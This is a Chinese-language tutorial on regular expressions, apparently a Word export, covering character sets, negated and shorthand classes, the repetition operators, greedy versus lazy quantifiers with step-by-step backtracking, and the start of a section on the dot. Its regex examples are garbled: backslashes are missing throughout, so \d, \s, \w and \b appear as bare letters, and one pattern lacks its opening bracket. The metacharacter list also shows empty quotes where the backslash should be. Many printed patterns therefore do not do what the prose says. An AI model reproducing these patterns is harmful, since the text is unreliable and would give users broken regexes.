<p><span lang="ZH-CN" style="font-family: 宋体;">你可以轻易分辨出所使用的引擎是文本导向还是正则导向。如果反向引用或&ldquo;惰性&rdquo;量词被实现，则可以肯定你使用的引擎是正则导向的。你可以作如下测试：将正则表达式</span>&lt;&lt;regex|regex not&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">应用到字符串&ldquo;</span>regex not<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。如果匹配的结果是</span>regex<span lang="ZH-CN" style="font-family: 宋体;">，则引擎是正则导向的。如果结果是</span>regex not<span lang="ZH-CN" style="font-family: 宋体;">，则是文本导向的。因为正则导向的引擎是&ldquo;猴急&rdquo;的，它会很急切的进行表功，报告它找到的第一个匹配</span><span lang="ZH-CN"> </span><span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">正则导向的引擎总是返回最左边的匹配</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">这是需要你理解的很重要的一点：即使以后有可能发现一个&ldquo;更好&rdquo;的匹配，正则导向的引擎也总是返回最左边的匹配。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">当把</span>&lt;&lt;cat&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">应用到&ldquo;</span>He captured a catfish for his cat<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，引擎先比较</span>&lt;&lt;c&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">和&ldquo;</span>H<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，结果失败了。于是引擎再比较</span>&lt;&lt;c&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">和&ldquo;</span>e<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，也失败了。直到第四个字符，</span>&lt;&lt;c&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配了&ldquo;</span>c<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span>&lt;&lt;a&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配了第五个字符。到第六个字符</span>&lt;&lt;t&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">没能匹配&ldquo;</span>p<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，也失败了。引擎再继续从第五个字符重新检查匹配性。直到第十五个字符开始，</span>&lt;&lt;cat&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配上了&ldquo;</span>catfish<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;中的&ldquo;</span>cat<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，正则表达式引擎急切的返回第一个匹配的结果，而不会再继续查找是否有其他更好的匹配。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><o:p>&nbsp;</o:p></p>
<p><strong><span style=""><span style="">5.<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>**</strong><span lang="ZH-CN" style="font-family: 宋体;">字符集</span><o:p></o:p>**</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">字符集是由一对方括号&ldquo;</span>[]<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;括起来的字符集合。使用字符集，你可以告诉正则表达式引擎仅仅匹配多个字符中的一个。如果你想匹配一个&ldquo;</span>a<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;或一个&ldquo;</span>e<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，使用</span>&lt;&lt;[ae]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。你可以使用</span>&lt;&lt;gr[ae]y&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配</span>gray<span lang="ZH-CN" style="font-family: 宋体;">或</span>grey<span lang="ZH-CN" style="font-family: 宋体;">。这在你不确定你要搜索的字符是采用美国英语还是英国英语时特别有用。相反，</span>&lt;&lt;gr[ae]y&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">将不会匹配</span>graay<span lang="ZH-CN" style="font-family: 宋体;">或</span>graey<span lang="ZH-CN" style="font-family: 宋体;">。字符集中的字符顺序并没有什么关系，结果都是相同的。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">你可以使用连字符&ldquo;</span>-<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;定义一个字符范围作为字符集。</span>&lt;&lt;[0-9]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配</span>0<span lang="ZH-CN" style="font-family: 宋体;">到</span>9<span lang="ZH-CN" style="font-family: 宋体;">之间的单个数字。你可以使用不止一个范围。</span>&lt;&lt;[0-9a-fA-F] &gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配单个的十六进制数字，并且大小写不敏感。你也可以结合范围定义与单个字符定义。</span>&lt;&lt;[0-9a-fxA-FX]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配一个十六进制数字或字母</span>X<span lang="ZH-CN" style="font-family: 宋体;">。再次强调一下，字符和范围定义的先后顺序对结果没有影响。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">字符集的一些应用</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">查找一个可能有拼写错误的单词，比如</span>&lt;&lt;sep[ae]r[ae]te&gt;&gt; <span lang="ZH-CN" style="font-family: 宋体;">或</span><span lang="ZH-CN"> </span>&lt;&lt;li[cs]en[cs]e&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">查找程序语言的标识符，</span>&lt;&lt;A-Za-z_][A-Za-z_0-9]<em>&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。</span>(</em><span lang="ZH-CN" style="font-family: 宋体;">表示重复</span>0<span lang="ZH-CN" style="font-family: 宋体;">或多次</span>)</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">查找</span>C<span lang="ZH-CN" style="font-family: 宋体;">风格的十六进制数</span>&lt;&lt;0[xX][A-Fa-f0-9]+&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。</span>(+<span lang="ZH-CN" style="font-family: 宋体;">表示重复一次或多次</span>)</p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">取反字符集</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">在左方括号&ldquo;</span>[<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;后面紧跟一个尖括号&ldquo;</span>^<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，将会对字符集取反。结果是字符集将匹配任何不在方括号中的字符。不像&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，取反字符集是可以匹配回车换行符的。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">需要记住的很重要的一点是，取反字符集必须要匹配一个字符。</span>&lt;&lt;q[^u]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">并不意味着：匹配一个</span>q<span lang="ZH-CN" style="font-family: 宋体;">，后面没有</span>u<span lang="ZH-CN" style="font-family: 宋体;">跟着。它意味着：匹配一个</span>q<span lang="ZH-CN" style="font-family: 宋体;">，后面跟着一个不是</span>u<span lang="ZH-CN" style="font-family: 宋体;">的字符。所以它不会匹配&ldquo;</span>Iraq<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;中的</span>q<span lang="ZH-CN" style="font-family: 宋体;">，而会匹配&ldquo;</span>Iraq is a country<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;中的</span>q<span lang="ZH-CN" style="font-family: 宋体;">和一个空格符。事实上，空格符是匹配中的一部分，因为它是一个&ldquo;不是</span>u<span lang="ZH-CN" style="font-family: 宋体;">的字符&rdquo;。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">如果你只想匹配一个</span>q<span lang="ZH-CN" style="font-family: 宋体;">，条件是</span>q<span lang="ZH-CN" style="font-family: 宋体;">后面有一个不是</span>u<span lang="ZH-CN" style="font-family: 宋体;">的字符，我们可以用后面将讲到的向前查看来解决。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">字符集中的元字符</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">需要注意的是，在字符集中只有</span>4<span lang="ZH-CN" style="font-family: 宋体;">个</span><span lang="ZH-CN"> </span><span lang="ZH-CN" style="font-family: 宋体;">字符具有特殊含义。它们是：&ldquo;</span>]  ^ -<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。&ldquo;</span>]<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;代表字符集定义的结束；&ldquo;</span><span lang="ZH-CN" style="font-family: 宋体;">&rdquo;代表转义；&ldquo;</span>^<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;代表取反；&ldquo;</span>-<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;代表范围定义。其他常见的元字符在字符集定义内部都是正常字符，不需要转义。例如，要搜索星号</span><em><span lang="ZH-CN" style="font-family: 宋体;">或加号</span>+<span lang="ZH-CN" style="font-family: 宋体;">，你可以用</span>&lt;&lt;[+</em>]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。当然，如果你对那些通常的元字符进行转义，你的正则表达式一样会工作得很好，但是这会降低可读性。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">在字符集定义中为了将反斜杠&ldquo;</span><span lang="ZH-CN" style="font-family: 宋体;">&rdquo;作为一个文字字符而非特殊含义的字符，你需要用另一个反斜杠对它进行转义。</span>&lt;&lt;[\x]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">将会匹配一个反斜杠和一个</span>X<span lang="ZH-CN" style="font-family: 宋体;">。&ldquo;</span>]^-<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;都可以用反斜杠进行转义，或者将他们放在一个不可能使用到他们特殊含义的位置。我们推荐后者，因为这样可以增加可读性。比如对于字符&ldquo;</span>^<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，将它放在除了左括号&ldquo;</span>[<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;后面的位置，使用的都是文字字符含义而非取反含义。如</span>&lt;&lt;[x^]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">会匹配一个</span>x<span lang="ZH-CN" style="font-family: 宋体;">或</span>^<span lang="ZH-CN" style="font-family: 宋体;">。</span>&lt;&lt;[]x]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">会匹配一个&ldquo;</span>]<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;或&ldquo;</span>x<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span>&lt;&lt;[-x]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">或</span>&lt;&lt;[x-]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">都会匹配一个&ldquo;</span>-<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;或&ldquo;</span>x<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">字符集的简写</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">因为一些字符集非常常用，所以有一些简写方式。</span></p>
<p>&lt;&lt;d&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">代表</span>&lt;&lt;[0-9]&gt;&gt;;</p>
<p>&lt;&lt;w&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">代表单词字符。这个是随正则表达式实现的不同而有些差异。绝大多数的正则表达式实现的单词字符集都包含了</span>&lt;&lt;A-Za-z0-9_]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p>&lt;&lt;s&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">代表&ldquo;白字符&rdquo;。这个也是和不同的实现有关的。在绝大多数的实现中，都包含了空格符和</span>Tab<span lang="ZH-CN" style="font-family: 宋体;">符，以及回车换行符</span>&lt;&lt;rn&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">字符集的缩写形式可以用在方括号之内或之外。</span>&lt;&lt;sd&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配一个白字符后面紧跟一个数字。</span>&lt;&lt;[sd]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配单个白字符或数字。</span>&lt;&lt;[da-fA-F]&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">将匹配一个十六进制数字。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">取反字符集的简写</span></p>
<p>&lt;&lt;[S]&gt;&gt; = &lt;&lt;[^s]&gt;&gt;</p>
<p>&lt;&lt;[W]&gt;&gt; = &lt;&lt;[^w]&gt;&gt;</p>
<p>&lt;&lt;[D]&gt;&gt; = &lt;&lt;[^d]&gt;&gt;</p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">字符集的重复</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">如果你用&ldquo;</span>?*+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;操作符来重复一个字符集，你将会重复整个字符集。而不仅是它匹配的那个字符。正则表达式</span>&lt;&lt;[0-9]+&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">会匹配</span>837<span lang="ZH-CN" style="font-family: 宋体;">以及</span>222<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">如果你仅仅想重复被匹配的那个字符，可以用向后引用达到目的。我们以后将讲到向后引用。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><o:p>&nbsp;</o:p></p>
<p><strong><span style=""><span style="">6.<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>**</strong><span lang="ZH-CN" style="font-family: 宋体;">使用</span>?<strong>*</strong><span lang="ZH-CN" style="font-family: 宋体;">或</span>+ <strong>**<span lang="ZH-CN" style="font-family: 宋体;">进行重复</span><o:p></o:p></strong></p>
<p>?<span lang="ZH-CN" style="font-family: 宋体;">：告诉引擎匹配前导字符</span>0<span lang="ZH-CN" style="font-family: 宋体;">次或一次。事实上是表示前导字符是可选的。</span></p>
<p>+<span lang="ZH-CN" style="font-family: 宋体;">：告诉引擎匹配前导字符</span>1<span lang="ZH-CN" style="font-family: 宋体;">次或多次</span></p>
<p>*<span lang="ZH-CN" style="font-family: 宋体;">：告诉引擎匹配前导字符</span>0<span lang="ZH-CN" style="font-family: 宋体;">次或多次</span></p>
<p>&lt;[A-Za-z][A-Za-z0-9]*&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配没有属性的</span>HTML<span lang="ZH-CN" style="font-family: 宋体;">标签，&ldquo;</span>&lt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;以及&ldquo;</span>&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;是文字符号。第一个字符集匹配一个字母，第二个字符集匹配一个字母或数字。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">我们似乎也可以用</span>&lt;[A-Za-z0-9]+&gt;<span lang="ZH-CN" style="font-family: 宋体;">。但是它会匹配</span>&lt;1&gt;<span lang="ZH-CN" style="font-family: 宋体;">。但是这个正则表达式在你知道你要搜索的字符串不包含类似的无效标签时还是足够有效的。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">限制性重复</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">许多现代的正则表达式实现，都允许你定义对一个字符重复多少次。词法是：</span>{min,max}<span lang="ZH-CN" style="font-family: 宋体;">。</span>min<span lang="ZH-CN" style="font-family: 宋体;">和</span>max<span lang="ZH-CN" style="font-family: 宋体;">都是非负整数。如果逗号有而</span>max<span lang="ZH-CN" style="font-family: 宋体;">被忽略了，则</span>max<span lang="ZH-CN" style="font-family: 宋体;">没有限制。如果逗号和</span>max<span lang="ZH-CN" style="font-family: 宋体;">都被忽略了，则重复</span>min<span lang="ZH-CN" style="font-family: 宋体;">次。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">因此</span>{0,}<span lang="ZH-CN" style="font-family: 宋体;">和</span>*<span lang="ZH-CN" style="font-family: 宋体;">一样，</span>{1<span lang="ZH-CN" style="font-family: 宋体;">，</span>}<span lang="ZH-CN" style="font-family: 宋体;">和</span>+ <span lang="ZH-CN" style="font-family: 宋体;">的作用一样。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">你可以用</span>&lt;&lt;b[1-9][0-9]{3}b&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配</span>1000~9999<span lang="ZH-CN" style="font-family: 宋体;">之间的数字</span>(<span lang="ZH-CN" style="font-family: 宋体;">&ldquo;</span>b<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;表示单词边界</span>)<span lang="ZH-CN" style="font-family: 宋体;">。</span>&lt;&lt;b[1-9][0-9]{2,4}b&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配一个在</span>100~99999<span lang="ZH-CN" style="font-family: 宋体;">之间的数字。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">注意贪婪性</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">假设你想用一个正则表达式匹配一个</span>HTML<span lang="ZH-CN" style="font-family: 宋体;">标签。你知道输入将会是一个有效的</span>HTML<span lang="ZH-CN" style="font-family: 宋体;">文件，因此正则表达式不需要排除那些无效的标签。所以如果是在两个尖括号之间的内容，就应该是一个</span>HTML<span lang="ZH-CN" style="font-family: 宋体;">标签。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">许多正则表达式的新手会首先想到用正则表达式</span>&lt;&lt; &lt;.+&gt; &gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">，他们会很惊讶的发现，对于测试字符串，&ldquo;</span>This is a &lt;EM&gt;first&lt;/EM&gt; test<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，你可能期望会返回</span>&lt;EM&gt;<span lang="ZH-CN" style="font-family: 宋体;">，然后继续进行匹配的时候，返回</span>&lt;/EM&gt;<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">但事实是不会。正则表达式将会匹配&ldquo;</span>&lt;EM&gt;first&lt;/EM&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。很显然这不是我们想要的结果。原因在于&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;是贪婪的。也就是说，&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;会导致正则表达式引擎试图尽可能的重复前导字符。只有当这种重复会引起整个正则表达式匹配失败的情况下，引擎会进行回溯。也就是说，它会放弃最后一次的&ldquo;重复&rdquo;，然后处理正则表达式余下的部分。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">和&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;类似，&ldquo;</span>?*<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;的重复也是贪婪的。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">深入正则表达式引擎内部</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">让我们来看看正则引擎如何匹配前面的例子。第一个记号是&ldquo;</span>&lt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，这是一个文字符号。第二个符号是&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，匹配了字符&ldquo;</span>E<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，然后&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;一直可以匹配其余的字符，直到一行的结束。然后到了换行符，匹配失败</span>(<span lang="ZH-CN" style="font-family: 宋体;">&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;不匹配换行符</span>)<span lang="ZH-CN" style="font-family: 宋体;">。于是引擎开始对下一个正则表达式符号进行匹配。也即试图匹配&ldquo;</span>&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。到目前为止，&ldquo;</span>&lt;.+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;已经匹配了&ldquo;</span>&lt;EM&gt;first&lt;/EM&gt; test<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。引擎会试图将&ldquo;</span>&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;与换行符进行匹配，结果失败了。于是引擎进行回溯。结果是现在&ldquo;</span>&lt;.+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;匹配&ldquo;</span>&lt;EM&gt;first&lt;/EM&gt; tes<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。于是引擎将&ldquo;</span>&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;与&ldquo;</span>t<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;进行匹配。显然还是会失败。这个过程继续，直到&ldquo;</span>&lt;.+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;匹配&ldquo;</span>&lt;EM&gt;first&lt;/EM<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，&ldquo;</span>&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;与&ldquo;</span>&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;匹配。于是引擎找到了一个匹配&ldquo;</span>&lt;EM&gt;first&lt;/EM&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。记住，正则导向的引擎是&ldquo;急切的&rdquo;，所以它会急着报告它找到的第一个匹配。而不是继续回溯，即使可能会有更好的匹配，例如&ldquo;</span>&lt;EM&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。所以我们可以看到，由于&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;的贪婪性，使得正则表达式引擎返回了一个最左边的最长的匹配。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">用懒惰性取代贪婪性</span><o:p></o:p></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">一个用于修正以上问题的可能方案是用&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;的惰性代替贪婪性。你可以在&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;后面紧跟一个问号&ldquo;</span>?<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;来达到这一点。&ldquo;</span>*<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，&ldquo;</span>{}<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;和&ldquo;</span>?<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;表示的重复也可以用这个方案。因此在上面的例子中我们可以使用&ldquo;</span>&lt;.+?&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。让我们再来看看正则表达式引擎的处理过程。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">再一次，正则表达式记号&ldquo;</span>&lt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;会匹配字符串的第一个&ldquo;</span>&lt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。下一个正则记号是&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。这次是一个懒惰的&ldquo;</span>+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;来重复上一个字符。这告诉正则引擎，尽可能少的重复上一个字符。因此引擎匹配&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;和字符&ldquo;</span>E<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，然后用&ldquo;</span>&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;匹配&ldquo;</span>M<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，结果失败了。引擎会进行回溯，和上一个例子不同，因为是惰性重复，所以引擎是扩展惰性重复而不是减少，于是&ldquo;</span>&lt;.+<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;现在被扩展为&ldquo;</span>&lt;EM<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。引擎继续匹配下一个记号&ldquo;</span>&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。这次得到了一个成功匹配。引擎于是报告&ldquo;</span>&lt;EM&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;是一个成功的匹配。整个过程大致如此。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">惰性扩展的一个替代方案</span><o:p></o:p></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">我们还有一个更好的替代方案。可以用一个贪婪重复与一个取反字符集：&ldquo;</span>&lt;[^&gt;]+&gt;<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。之所以说这是一个更好的方案在于使用惰性重复时，引擎会在找到一个成功匹配前对每一个字符进行回溯。而使用取反字符集则不需要进行回溯。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">最后要记住的是，本教程仅仅谈到的是正则导向的引擎。文本导向的引擎是不回溯的。但是同时他们也不支持惰性重复操作。</span><o:p></o:p></p>
<p><o:p>&nbsp;</o:p></p>
<p><strong><span style=""><span style="">7.<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>**</strong><span lang="ZH-CN" style="font-family: 宋体;">使用&ldquo;</span>.<strong>**<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;匹配几乎任意字符</span><o:p></o:p></strong></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">在正则表达式中，&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;是最常用的符号之一。不幸的是，它也是最容易被误用的符号之一。</span></p>
